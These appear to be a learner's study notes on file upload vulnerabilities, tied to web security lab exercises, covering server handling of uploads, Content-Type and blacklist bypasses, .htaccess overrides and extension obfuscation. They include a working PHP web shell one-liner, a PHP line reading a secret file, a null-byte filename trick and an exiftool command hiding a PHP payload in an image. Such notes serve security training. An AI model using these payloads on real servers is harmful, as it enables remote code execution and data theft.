- upload files without sufficient validation
	- basic image can execute script
- websites now are more dynamic and the path of a request has no direct relationship to the filesystem (actual path vs URL path can be different - example.com/images == /var/www/images)
1. if file type is non-executable (image or static page, server may just send the file's contents to the client in an HTTP response)
2. if file is executable (php file etc.), and the server is configured to execute files of this type, it will assign variables based on headers and parameters in the HTTP request before running the script
	- resulting output may then be sent to the client in an HTTP response
3. if the file type is executable but the server is not configured to execute the file, it will respond with an error or output the contents of the file may be served as plaintext
- look at `Content-Type` header and `MIME` to the type of file being served.
	`<?php echo system($_GET['command']); ?>` : this allows a system command to be passed into the URL via a query parameter
	`GET /example/exploit.php?command=id HTTP/1.1`
	`<?php echo file_get_contents('/home/carlos/secret');?>` : retrieve contents of the `secret` file
Lab: [[Remote Code Execution Via Web Shell Upload]]
# Flawed Validation Of File Uploads
## Flawed File Type Validation 
- the following `Content-Type` are used typically to send data in a `POST` request:
	- `application/x-www-form-url-encoded` : sends simple text like name or address
	- `multipart/form-data` : sending large amounts of binary data (images etc.)
- if no further validation to check if the actual contents of the file is the given `MIME` type, can exploit
Lab: [[Web Shell Upload Via Content-Type Restriction Bypass]]
## Preventing File Execution In User Accessible Directories
- second line of defense (first being stopping dangerous file types from being uploaded) is to stop the server from executing any scripts that slip through the net
	- servers generally run scripts whose `MIME` type they have been specifically configured to execute
		- otherwise, error message or content in plaintext returned:
			```
			GET /static/exploit.php?command=id HTTP/1.1
			    Host: normal-website.com
			
			    HTTP/1.1 200 OK
			    Content-Type: text/plain
			    Content-Length: 39
			
			    <?php echo system($_GET['command']); ?>
			```
- web servers often use `filename` field in `multipart/form-data` to determine the name and location where the file should be saved
Lab: [[Web Shell Upload Via Path Traversal]]
## Insufficient Blacklisting Of Dangerous File Types
- blacklisting file types (eg. php) can be overcome by using alternative file extensions like `.php5` or `.shtml`
### Overriding Server Configuration 
- servers won't execute files unless they are configured to do so
- for Apache servers to execute files, the following must be added to `/etc/apache2/apache2.conf` file:
	```
	LoadModule php_module /usr/lib/apache2/modules/libphp.so
	AddType application/x-httpd-php .php
	```
- this allows mapping of an executable to the correct `MIME` type
	- Note*: only add `LoadModule php_module /usr/lib/apache2/modules/libphp.so` when `mod_php` is not in the server
	- DO NOT INDENT DIRECTIVES
- servers allow developers to create special configuration files within individual directories in order to override or add 1 or more global settings
	- can upload a `.htaccess` file to a directory to allow for a certain extension and then upload the exploit into the same directory
	- Apache servers will load a directory-specific configuration from a file call `.htaccess` if one is present
- developers can make such files on IIS servers using `web.config` file. this can include the following:
	```
	<staticContent>
	    <mimeMap fileExtension=".json" mimeType="application/json" />
	    </staticContent>
	```
- normally not allowed to access such files via HTTP requests. 
	- however, there can be servers that fail to stop you from uploading malicious config files
		- even if file server is blacklisted, can override the config file to trick the server into mapping arbitrary file extension to an executable MIME type that is allowed thanks to your script
# Obfuscation of File Extension
- try hiding it in different ways, such as :
	`exploit.php%00.jpg`
# Hiding Scripts in Images
- use `exiftool` to hide scripts in images in order to bypass content dimensions checking
- How to hide: https://shouts.dev/articles/hide-payload-in-image-file-using-exiftool
	```
	┌──(roshan㉿roshan)-[~/BSCP/file_upload]
	└─$ exiftool -comment="<?php echo '123 '.file_get_contents('/home/carlos/secret').' 123 ';?>" image.jpg
	    1 image files updated
	```
